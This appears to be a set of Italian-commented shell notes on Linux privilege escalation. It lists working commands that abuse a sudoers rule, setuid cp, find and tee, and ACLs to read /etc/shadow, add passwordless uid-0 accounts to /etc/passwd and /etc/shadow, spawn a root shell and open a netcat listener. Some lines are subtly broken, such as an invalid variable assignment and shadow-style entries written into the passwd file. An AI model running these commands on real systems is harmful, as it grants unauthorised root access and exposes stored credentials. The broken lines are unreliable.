#------------------------FILE SUDOERS---------------------------
sudo adduser guest #aggiunge un nuovo utente
sudo passwd guest #imposta la password per l'utente guest

sudo nano /etc/sudoers #modifica il file sudoers
guest ALL=(root) NOPASSWD:/usr/bin/vi /var/www/html/* #aggiunge i permessi per l'utente guest

#Entriamo con l'utente guest
su guest
sudo vi /var/www/html/../../etc/passwd 
#modifica il file passwd
guest:x:0:0:guest,,,:/home/guest:/bin/bash

#Al prossimo login l'utente guest avrà i permessi di root

# ------------------------COMANDO CP --------------------------------
#Supponiamo che il comando /usr/bin/cp abbia i permessi di root
chmod +s /usr/bin/cp #Imposta il setuid sul comando cp
#Attraverso il comando cp è possibile effettuare una privilege escalation nel seguente modo:
cp /etc/passwd /tmp/passwd #Copia il file passwd in /tmp
cp /etc/shadow /tmp/shadow

#2. I file copiati non hanno permessi di scrittura, dato che non possiamo usare sudo utilizziamo il comando cat
cat /tmp/passwd > mypasswd
cat /tmp/shadow > myshadow

#Utente toor senza password con uid 0 e gid 0
echo "toor:x:0:0:toor,,,:/root:/bin/bash" >> /tmp/mypasswd
#In caso serva impostare una password
echo "toor:x:19043:0:99999:7:::" >> /tmp/myshadow

#Modifichiamo il file shadow per l'utente toor
echo "toor::19043:0:99999:7:::" >> /tmp/myshadow


#Generiamo una password per l'utente hack
#per generare il salt
openssl rand -base64 32 
#Risultato
qaO8L7aqAN03uhGyg5X+1/ceW5C4e8pRVREZ0kXK9QE=
#Generiamo la password 
openssl passwd -6 -salt qaO8L7aqAN03uhGyg5X+1/ceW5C4e8pRVREZ0kXK9QE= hack

#In generale 
openssl passwd algoritmo_hash -salt salt password
echo "toor:$PASS:19043:0:99999:7:::" >> /tmp/myshadow


#Copiamo i file modificati in /etc
cp /tmp/mypasswd /etc/passwd
cp /tmp/myshadow /etc/shadow

#Diventiamo l'utente toor
su toor

#Ora siamo l'utente toor con permessi di root
id 

#Creo una nuova password per l'utente guest
openssl passwd -1 -salt guest guest >> /tmp/entry
$ENTRY=$(cat /tmp/entry)
echo "guest:$ENTRY:0:0:/root:/bin/bash" >> /tmp/passwd
cp /tmp/passwd /etc/passwd #Copia il file passwd modificato in /etc 
cp /tmp/myshadow /etc/shadow

# ------------------------COMANDO FIND --------------------------------
tramite il comando find è possibile effettuare una privilege escalation nel seguente modo:
sudo chmod +s /usr/bin/find #Imposta il setuid sul comando find
#Il comando find viene lanciato con i privilegi di root ( in caso abbia il setuid impostato)
find / -name "filename" -exec /bin/sh \; #per eseguire una shell con i permessi di root
find /etc/shadow -exec cat {} \; #per leggere il contenuto del file shadow
find /any/file -exec nc -l -p 80 \;  #Permette di aprire una porta in ascolto sulla macchina vittima

#--------------------------COMANDO TEE--------------------------------
grep "guest" /etc/passwd > guest.pwd
#guest:x:1001:1001:guest,,,:/home/guest:/bin/bash
#Modifica il file passwd
guest:x:0:0:guest,,,:/home/guest:/bin/bash
cat guest.pwd | tee -a /etc/passwd


#Generazione di una password con openssl
openssl passwd -1 -salt guest guest #Genera una password per l'utente guest con salt guest

#----------------------ACL--------------------------------
#Per individuare i file con ACL impostate senza mostrare i permission denied
getfacl -R / 2>/dev/null 

#Ad esempio viene consentito all'utente guest di leggere il file /etc/shadow
setfacl -m u:guest:r /etc/shadow

#Oppure viene consentito all'utente guest di scrivere in /etc/shadow
setfacl -m u:guest:w /etc/shadow

#In questo modo guest può inserire una nuova password per l'utente root
openssl passwd -1 -salt root root >> /tmp/entry
$ENTRY=$(cat /tmp/entry)
echo "root:$ENTRY:0:0:/root:/bin/bash" >> /etc/shadow
